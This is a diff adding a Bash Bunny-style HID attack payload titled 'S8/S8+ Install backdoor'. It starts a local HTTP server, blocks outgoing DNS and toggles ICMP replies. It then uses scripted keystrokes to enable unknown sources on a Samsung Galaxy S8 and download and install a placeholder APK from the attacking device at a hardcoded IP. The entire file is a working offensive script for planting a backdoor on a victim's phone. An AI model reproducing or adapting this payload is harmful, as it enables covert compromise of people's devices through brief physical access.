@@ -1,0 +1,150 @@
+#
+# HIDAAF
+# S8/S8+ Install backdoor
+#
+##################################
+LED SETUP
+PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
+cd $PAYLOAD_DIR
+SERVER_LOG=server.log
+
+# Fresh Server Log
+rm -f $SERVER_LOG
+# Disable ICMP/echo replies so our powershell stager doesn't attempt to access the SMB share before smbserver starts (workaround since Test-NetConnection 172.16.64.1 SMB only works on powershell 4.0+ for Windows 8+)
+echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+# Check for psh.txt
+if [ ! -f $PAYLOAD_DIR/psh.txt ]; then
+    LED FAIL
+    exit 1
+fi
+
+# Attack HID
+
+# Attack Ethernet
+LED STAGE2
+
+# Start web server
+iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
+python -m SimpleHTTPServer 80 > $SERVER_LOG 2>&1 &
+
+# wait until python web server is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+# Re-enable ICMP/echo replies to trip the powershell stager
+echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+LED STAGE3
+ATTACKMODE HID ECM_ETHERNET
+LED B
+Q DELAY 1000
+Q GUI N
+Q DELAY 1000
+Q TAB 
+Q TAB  
+Q TAB  
+Q UP 
+Q UP  
+Q UP  
+Q UP  
+Q UP  
+Q UP  
+Q UP  
+Q RIGHT  
+Q RIGHT  
+Q RIGHT  
+Q RIGHT  
+Q RIGHT 
+Q UP  
+Q UP  
+Q UP  
+Q DELAY 100
+Q ENTER 
+Q DELAY 1000
+Q UP 
+Q DELAY 100
+Q ENTER 
+Q DELAY 100
+Q STRING "#SOURCES#"
+Q DELAY 5000
+Q DOWN 
+Q DELAY 100
+Q ENTER 
+Q DELAY 1000
+Q ENTER 
+Q DELAY 100
+Q RIGHT  
+Q DELAY 100
+Q ENTER 
+Q DELAY 100
+Q ESC
+Q ESC
+Q ESC
+Q DELAY 100
+Q ESC
+Q DELAY 1000
+Q STRING "1"
+Q DELAY 3000
+Q STRING "72.16.64.1"
+Q DELAY 100
+Q STRING "/"
+Q DELAY 100
+Q STRING "#APKNAME#"
+Q DELAY 500
+Q ENTER 
+Q DELAY 5000
+Q ESC
+Q DELAY 100
+Q ESC
+Q ESC
+Q ESC
+Q ESC
+Q DELAY 1000
+Q GUI N
+Q DELAY 1000
+Q UP 
+Q UP  
+Q UP  
+Q UP  
+Q UP  
+Q UP  
+Q UP  
+Q TAB 
+Q TAB  
+Q TAB 
+Q TAB 
+Q TAB  
+Q TAB 
+Q DELAY 100
+Q DOWN
+Q DELAY 100
+Q DOWN
+Q DELAY 100
+Q ENTER
+Q DELAY 1000
+Q TAB
+Q DELAY 100
+Q TAB
+Q DELAY 100
+Q TAB
+Q DELAY 100
+Q ENTER
+Q DELAY 100
+Q TAB
+Q DELAY 100
+Q TAB
+Q DELAY 100
+Q ENTER
+Q DELAY 10000
+Q TAB
+Q DELAY 100
+Q ENTER
+Q DELAY 100
+Q ESC
+Q ESC
+Q ESC
+Q ESC
+Q ESC
+Q ESC
+Q DELAY 100
+LED R
+SHUTDOWN 0
